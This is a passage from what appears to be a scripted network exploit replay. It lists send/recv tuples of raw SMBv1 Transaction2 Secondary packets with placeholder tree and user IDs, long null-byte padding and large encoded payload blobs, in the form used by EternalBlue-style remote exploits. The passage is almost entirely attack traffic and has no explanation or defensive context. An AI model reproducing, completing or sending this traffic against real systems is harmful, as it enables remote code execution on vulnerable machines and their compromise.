00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00', 0.0)"", ""('recv', 1, 0.0)"", ""('send', 1, b'\\x00\\x00\\x105\\xffSMB3\\x00\\x00\\x00\\x00\\x18\\x07\\xc0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00__TREEID__PLACEHOLDER__\\xff\\xfe__USERID__PLACEHOLDER__@\\x00\\t\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x105\\x00\\xd0\\x03\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x83\\xf3h6agLCqPqVyXi2VSQ8O6Yb9ijBX54jY6KM+sz33NmS6TK8XlOk920s0E0aajOV++wrR92ds1FOLBO+evLPj4sIvAjLvaLdgk8+BlNZs8PMa9bQ340J83nx1p4f+GLpbxUyzsAzkE9gB3hBYp3+0hNXMjbyjXwB40Q4KiDbip/d7N0CmRT1gLy+n2Rp/EYO5Fkapa4Y4kqDhPvLuOfGUvjN4BNdBk23r0/F3ZmfIe7zH9ecfDqJkkApLkf3Ls4CMvJ48cbGhUqHrML0az1LCeE3BqKLCL3gP10fExyMnFGtbq3rBd+5eKxSXYVD4fBKtFYI47YYbjYxxF76O9LNZEpPP9SiCEo9qRYLDcYzGu81JRU7/GHDKWSnvgjForSvyRO/e9ElIg1ISeyywaPJA1t1skDj8abBEOqAOXimo54/eZzGmLJ92xLwDIl8rHuZsUywgeZH/tSPXYQi0Pswy57TYZ/0/mXVIQjwi8EdJohFb3TKAzdHRMYopPusHBP7qyy18UVuiwGaf989u6seK2ER1R+aoJtvES8V0Zsx6slbdWrGxe4P62uwFxXStC/+qpCauvw/qpZvZo9wb458ezftwsbuOUYNlMWgBno/tWp5iSKfApu/I3RbVgaE3OmiLNYN3jw0gC5cT5tZZvDw9cBmHGcaVuvs+JAbsWoEsUaZd3R3Mn/1c1xYAumA/0VVaASNuohaU+8CmGSpny9/6ngCdejX4X//UMPKFxhlfaDnGbhbgr58SbJnYZ8KVeABMJeRJeLSP1f2AtrbAR8jSk5UgNllJcWnf+EM/Gyzh5DH0RqsyNfEbXNTxRzla1zNfWz0bB4fqzrdNNfNXvtTv9FWqyXCEHLhOz9p7JXzJBBUd0OR9rg8DFXIyNXMHCfeX5v/e2cDPWn7sSP1HU8sivMdWSP79eiYWZ6DOYjDkYmaBrFWuOKpwLyotORDEi1GMahE7btGFTN2IMgml2b9wZvqSuc7aAciGNkl7+NgmkG9r323QqSJrjCgp+DJ9URAkHRp/ovZWeh65j6G5mVS3o3Ux5cH2pfT/VZm8xsBsr1o2YKlVmsY6mPAOnlmaEwFLrPTm5WIYnd0yOc3abTlt6R1RfwenXgqn5K1K6Uq5o7T+KblzWV1TXo0zTIBD/CwnKbkITPd7GkK+fG/pVTIAGxuI84OwkE6U9/WO3niv3bgLtebI/5Oj2ESIrNTwBRdIGzDYcK1VTlSYl0RMsMMZvWqZAhNBs9xfpyBgzAn+5NpIUwKnm6HS2UbNab6SQIQF53r0+Rx8w7xZkOEayDuGvPQ32Y7zfHtM8o8wsNxWPtI1zCcMUyHPA3zAeGkKIy51j911mdZeLmlXULTazhCdl+lYNd6aoUthPLUew6ng+vSLSxqF1N7+/bFkcWd5vuCPigEKxEg+X3d+JviOJaI9GJ2HWIT8ehFzv6JP7ymkH0XaHYKIXXDbGpMhJWmZzOd+KeEt4MY6Be95bnyjLPxR8Htcc2E35+8q074yiBdThfaOMI18K65supem5lEgTe2lQdQurhhNhgbmYPpmWsSerB8R4CiDHQg6B1xxN9lpUnCWCn37Ib9vdQ2V90almoOSh5FfBxJiPIERqxvWkHqv3h/c0c8MZ3kLJi/+5PD+F/rT0hmgD1lUoqZ9KfEAB/ivMQzIbMnhoJ6DpDZwXvWgYON+Ti4Of8cD3JVZFHKCPtFO1LWNuXu9DHS0cChPvbPTNgL1fuz3hWniAOjJxyXhilxEmUKoCuaHrjL7/mCwA8mUTF8nZfDOYFw/CN4ol8UuKSKKNotx6s4EGyOXAGxRTqQw5Rqr70SWFUVy18EO3TCMj/3eC7HjDV7CAh6+160YbDs53m7AehAx+OlUNq01wPuaxFfSqlgcUG+9Rn1b/Xp1jvWeSkCNdYiiiXi1XwsMrdhKZGKroSXSSJclExe6ZgcNNPa/HgjvXbwtmRkgiGneql4mBYmKDzcXCkp/tjnL6/KriY81gMHN4G9ulMunxVyF8wybDcifTOxtarjLXVRuC1Y7vzYaEuHT\\x00\\x00\\x105\\xffSMB3\\x00\\x00\\x00\\x00\\x18\\x07\\xc0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00__TREEID__PLACEHOLDER__\\xff\\xfe__USERID__PLACEHOLDER__@\\x00\\t\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x105\\x00\\xd0\\x13\\x00\\x00\\x00\\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